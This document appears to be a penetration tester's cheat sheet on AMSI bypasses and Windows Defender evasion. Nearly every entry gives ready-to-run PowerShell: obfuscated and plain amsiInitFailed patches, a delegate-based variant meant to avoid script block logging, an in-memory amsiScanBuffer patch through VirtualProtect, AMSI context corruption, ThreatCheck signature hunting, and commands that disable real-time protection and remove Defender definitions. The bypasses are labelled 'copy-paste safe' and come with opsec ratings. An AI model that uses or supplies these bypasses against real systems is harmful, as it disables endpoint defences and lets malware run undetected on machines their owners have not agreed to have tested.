# AMSI Bypass & Defender Evasion

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## AMSI Bypasses

### Plain AMSI Patch (Detected by Most AVs — Obfuscate Before Use) [added: 2026-04]
- **Tags:** #AMSI #AMSIPatch #AmsiInitFailed #Reflection #PowerShell #DefenseEvasion #T1562.001
- **Trigger:** Need to load flagged PowerShell tools (PowerView, Rubeus, etc.) but AMSI blocks execution
- **Prereq:** PowerShell session on target host, no EDR blocking reflection-based patching
- **Yields:** AMSI disabled in current PowerShell session, allowing execution of flagged scripts/tools
- **Opsec:** High
- **Context:** Need to load flagged PowerShell tools (PowerView, etc.) — patch AMSI in current session
- **Payload/Method:**
  ```powershell
  # Plain bypass (WILL get flagged as-is — obfuscate or use alternatives)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | ?{$_} | %{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
  ```

### Obfuscated AMSI Bypass (Copy-Paste Safe) [added: 2026-04]
- **Tags:** #AMSI #Obfuscation #AMSIBypass #StringConcat #SignatureEvasion #DefenseEvasion #T1562.001
- **Trigger:** Plain AMSI patch detected by AV; need obfuscated variant that evades string signatures
- **Prereq:** PowerShell session on target host
- **Yields:** AMSI disabled in current session via obfuscated reflection (evades static signatures)
- **Opsec:** Med
- **Context:** Evades signature detection via string concatenation obfuscation
- **Payload/Method:**
  ```powershell
  sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GEt-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
  ```

### Delegate-Based AMSI Bypass (Bypasses PowerShell Autologging) [added: 2026-04]
- **Tags:** #AMSI #DelegateBypass #ScriptBlockLogging #StealthAMSI #Reflection #DefenseEvasion #T1562.001
- **Trigger:** Script Block Logging enabled; need stealthier AMSI bypass that avoids logging detection
- **Prereq:** PowerShell session on target host, .NET reflection not blocked
- **Yields:** AMSI disabled without triggering Script Block Logging as easily
- **Opsec:** Low
- **Context:** Stealthier — doesn't appear in Script Block Logging as easily
- **Payload/Method:**
  ```powershell
  [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Au'+'tomation.AmsiUtils')),'GetField').Invoke('amsiInitFailed',('NonPublic,Static' -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$true)
  ```

### AMSI Bypass: Patching amsiScanBuffer via P/Invoke VirtualProtect [added: 2026-04]
- **Tags:** #AMSI #amsiScanBuffer #PInvoke #VirtualProtect #MemoryPatch #DefenseEvasion #T1562.001
- **Trigger:** Reflection-based AMSI bypasses detected; need lower-level P/Invoke memory patching approach
- **Prereq:** PowerShell session, Add-Type compilation not blocked, amsi.dll loaded
- **Yields:** AMSI disabled via direct memory patching of amsiScanBuffer function
- **Opsec:** Med
- **Context:** Directly patch amsiScanBuffer in memory using P/Invoke to LoadLibrary/GetProcAddress/VirtualProtect. More reliable than reflection-based patches when AMSI reflection is monitored.
- **Payload/Method:**
  ```powershell
  Add-Type -TypeDefinition @"
  using System;
  using System.Runtime.InteropServices;
  public static class Kernel32 {
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string lpLibFileName);
      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  }
  "@;
  $patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
  $hModule = [Kernel32]::LoadLibrary("amsi.dll");
  $lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
  $lpflOldProtect = 0;
  [Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
  [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $lpAddress, $patch.Length);
  [Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
  ```

### AMSI Bypass: Forcing Error via Context Corruption [added: 2026-04]
- **Tags:** #AMSI #ContextCorruption #amsiContext #amsiSession #ErrorForcing #DefenseEvasion #T1562.001
- **Trigger:** Standard AMSI patches monitored; need alternate approach via corrupting AMSI context/session fields
- **Prereq:** PowerShell session, .NET reflection not blocked
- **Yields:** AMSI returns NOT_DETECTED on error, allowing all payloads to pass
- **Opsec:** Med
- **Context:** Corrupt the amsiContext and amsiSession fields to force AMSI errors. AMSI returns AMSI_RESULT_NOT_DETECTED on error, allowing payloads to pass.
- **Payload/Method:**
  ```powershell
  $utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
  $context = $utils.GetField('amsi'+'Context','NonPublic,Static');
  $session = $utils.GetField('amsi'+'Session','NonPublic,Static');
  $marshal = [System.Runtime.InteropServices.Marshal];
  $newContext = $marshal::AllocHGlobal(4);
  $context.SetValue($null,[IntPtr]$newContext);
  $session.SetValue($null,$null);
  ```

### ThreatCheck: Identify AV Signature Offsets [added: 2026-04]
- **Tags:** #ThreatCheck #AVEvasion #SignatureDetection #ByteOffset #Defender #PayloadDev #T1027
- **Trigger:** Payload gets flagged by Defender/AMSI; need to identify exact detection offset for targeted modification
- **Prereq:** ThreatCheck.exe available, payload binary to test, Windows host with Defender
- **Yields:** Exact byte offset triggering AV detection, enabling targeted payload modification
- **Opsec:** Low
- **Context:** Before deploying a payload, use ThreatCheck to find the exact byte offset that triggers Defender/AMSI detection, then modify only that section.
- **Payload/Method:** `ThreatCheck.exe -f .\YourFile.exe`

## Defender Enumeration & Control

### Defender Module Enumeration [added: 2026-04]
- **Tags:** #Defender #MpComputerStatus #ThreatDetection #AVEnum #SecurityControls #T1518.001
- **Trigger:** Before attempting evasion; need to understand current Defender status and recent detections
- **Prereq:** PowerShell access on target host
- **Yields:** Defender status, real-time protection state, recent threat detections and IDs
- **Opsec:** Low
- **Context:** Before attempting evasion, enumerate Defender status and recent threat detections to understand what's being flagged.
- **Payload/Method:**
  ```powershell
  Get-MpComputerStatus
  Get-MpThreat [-ThreatID XXXX]
  Get-MpThreatDetection [-ThreatID XXXX]
  ```

### Disable Windows Defender (If Already Elevated) [added: 2026-04]
- **Tags:** #Defender #DisableAV #SetMpPreference #RemoveDefinitions #DefenseEvasion #T1562.001
- **Trigger:** Have admin/SYSTEM on host; need to disable Defender before running offensive tools
- **Prereq:** Administrative/SYSTEM privileges on target host
- **Yields:** Real-time protection disabled, allowing offensive tool execution without AV interference
- **Opsec:** High
- **Context:** Have admin — kill real-time protection before running offensive tools
- **Payload/Method:**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true
  Set-MpPreference -DisableIOAVProtection $true

  # Remove signatures without disabling Defender (less detectable)
  "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
  ```
